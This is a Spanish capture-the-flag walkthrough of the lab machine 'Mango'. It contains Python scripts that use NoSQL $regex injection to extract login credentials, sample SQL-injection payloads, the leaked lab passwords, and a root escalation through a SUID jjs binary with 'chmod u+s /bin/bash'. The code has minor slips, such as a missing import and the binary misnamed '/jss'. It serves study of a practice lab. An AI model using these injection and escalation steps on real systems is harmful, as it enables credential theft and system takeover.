# 10.10.10.162 - Mango
![Mango](https://user-images.githubusercontent.com/96772264/205486503-983b7975-8f12-44be-83ef-f37cc3295498.png)

----------------------

Puertos abiertos: 22(ssh), 80(http), 443(https)

```console
└─$ openssl s_client -connect 10.10.10.162:443
staging-order.mango.htb, emailAddress = admin@mango.htb
└─$ whatweb http://10.10.10.162
[403 Forbidden] Apache[2.4.29], HTTPServer[Ubuntu Linux]
└─$ whatweb https://10.10.10.162
[200 OK] Apache[2.4.29], Bootstrap, Title[Mango | Search Base]
```
La web solo tiene un enlace funcional a /analytics.php, donde funciona solo al poner la ip (no mango.htb)
Hay una tabla de datos que podemos descargar al darle a "save". Aun así tampoco pude hacer mucho con eso.

![mango2](https://user-images.githubusercontent.com/96772264/205486597-767203ed-55a0-4f33-a5ab-1de82d6f54c6.PNG)

En el panel de login se manda:
```/POST a http://staging-order.mango.htb/ username=test&password=test&login=login PHPSESSID:"4h9rnhfsteketion8qoom89evt"```
![mango3](https://user-images.githubusercontent.com/96772264/205486608-b18ace9c-a0aa-41bb-a5bb-7f96218eca94.PNG)


Al ser un panel de login podemos hacer cuatro cosas:  
- Inyeccion SQL con payloads del tipo ```' or 1=1-- -``` ```' or sleep(5)-- -``` (...OR por AND y ' por "")  
- Inyeccion Type Jugling (PHP) -> "password=true"  
- Fuzzing de posibles contraseñas  
- NoSQlInyection -> contraseña[$ne]=test "La contraseña no es "test".  

Como estamos ante una web que maneja bases de datos (por lo que vimos en analytics) sera SQL o no SQL. La manera de probar el mirando el content lenght 
(El de la respuesta mala es 4022, es decir redireccion a la misma ruta) Todos los payloads sql fallan pero no NoSQL

```python
#!/usr/bin/python3

import requests
sess = requests.session()
url = "http://staging-order.mango.htb/"
req1 = sess.get(url)
headers = {'PHPSESSID': req1.cookies['PHPSESSID'], 'Content-Type':'application/x-www-form-urlencoded',}
data = {"username":"admin","password[$ne]":"test","login":"login"}
req2 = requests.post(url, data=data, headers=headers)
print(len(req2.text))
```

Aun así entrar nos devuelve este mensaje  "Todavía se están plantando (los mangos). Perdon por la inconveniencia, pero acabamos de emepezar la granja"  
Hay inyecciones NoSQL especiales que nos pueden ayudar a obtener información:  

```python
import requests, string

caracteres = string.ascii_lowercase + "_"
sess = requests.session()
url = "http://staging-order.mango.htb/"
req1 = sess.get(url)
headers = {'PHPSESSID': req1.cookies['PHPSESSID'], 'Content-Type':'application/x-www-form-urlencoded',}
nombre = ""
for character in caracteres:
    data = {"username[$regex]":"^" + character + ".*","password[$ne]":"test","login":"login"}
    req2 = requests.post(url, data=data, headers=headers)
    if len(req2.text) < 4022:
        print(character)
```
Conseguimos "a" y "m"  

```python3
nombre = "a"
for i in range(20):
    for character in caracteres:
        data = {"username[$regex]":"^" + nombre + character + ".*","password[$ne]":"test","login":"login"}
        req2 = requests.post(url, data=data, headers=headers)
        if len(req2.text) < 4022:
            nombre += character
            print(nombre)
```
Sale "admin", para el segundo (el que empieza por "m"), pongo ```nombre = "m"```  
No hay mas nombres por la "a", pero si los hubier se pondría ```caracteres = string.ascii_lowercase.strip("d")```  
para sacar la segunda letra (y que no fuera "d").  

```python
caracteres = string.printable
sess = requests.session()
url = "http://staging-order.mango.htb/"
req1 = sess.get(url)
headers = {'PHPSESSID': req1.cookies['PHPSESSID'], 'Content-Type':'application/x-www-form-urlencoded',}
contraseña = ""
while True:
    for character in caracteres:
        data = {"username":"admin","password[$regex]":"^" + contraseña + re.escape(character) + ".*","login":"login"}
        req2 = requests.post(url, data=data, headers=headers)
        if len(req2.text) < 4022:
            contraseña += character
			print(contraseña)
```
Creds -> admin:t9KcS3>!0B#2, mango:h3mXK8RhU~f{]f5H  

Con estas contraseñas podemos acceder por ssh con mango ```ssh mango@10.10.10.162```
- SUIDS: /usr/bin/run-mailcap, /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs  
- PUERTOS: 127.0.0.1:27017   

En [Gtfo-bins](https://gtfobins.github.io/gtfobins) hay entradas para ambos binarios, pero solo jjs tiene SUID.  
El comando es este (ej con "whoami") y se ejecutará en contenxto privilegiado.  
```echo "Java.type('java.lang.Runtime').getRuntime().exec('whoami').waitFor()" | /jss```  
El asunto esque la shell que nos proponen ```/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)```  
se queda atascada, asi que la solución sería el comando de hacer SUID a la bash ```chmod u+s /bin/bash```  
```console
admin@mango:/home/mango$ echo "Java.type('java.lang.Runtime').getRuntime().exec('chmod u+s /bin/bash').waitFor()" | /jss
admin@mango:/home/mango$ bash -p
bash-4.4# whoami
root
```
Aunque tenemos que leer la flag rapidamente porque no se porque hay ocasiones en que me bajan los privilegios.  

jjs sirve para invocar el motor "Nashorn", pero dicen que tanto el comando como el motor lo eliminarán en futuras versiones de java.
Java tira de motores y entornos virtuales para funcionar, es un lenguaje un tanto extraño.  
